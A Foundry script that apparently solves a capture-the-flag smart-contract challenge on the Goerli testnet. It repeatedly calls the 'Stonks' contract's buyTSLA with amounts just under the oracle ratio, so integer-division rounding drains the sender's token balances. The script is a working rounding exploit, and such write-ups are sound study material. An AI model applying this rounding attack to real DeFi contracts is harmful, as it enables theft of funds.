// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/ChallengeStonks.sol";

// https://goerli.etherscan.io/address/0x61aA1F71906376B6A7724E298CE62aADC5EeDFf0
contract ChallengeStonksScript is Script {
    address constant instance = 0x61aA1F71906376B6A7724E298CE62aADC5EeDFf0;
    uint256 constant TSLA = 0;
    uint256 constant GME = 1;
    uint256 constant ORACLE_TSLA_GME = 50;

    function run() public {
        vm.startBroadcast();

        Stonks stonks = Stonks(instance);
        uint256 tsla = stonks.balanceOf(msg.sender, TSLA);
        uint256 gme = stonks.balanceOf(msg.sender, GME);

        while (tsla > 0 || gme > 0) {
            while(gme > 0) {
                uint amountIn = ORACLE_TSLA_GME - 1;
                amountIn = amountIn > gme ? gme : amountIn;
                stonks.buyTSLA(amountIn, 0);
                gme -= amountIn;
            }

            uint amountIn = tsla;
            uint amountOut = amountIn * ORACLE_TSLA_GME;
            stonks.sellTSLA(amountIn, amountOut);
            tsla -= amountIn;
            gme += amountOut;
        }

        console.log("TSLA", stonks.balanceOf(msg.sender, TSLA));
        console.log("GME", stonks.balanceOf(msg.sender, GME));
    }
}
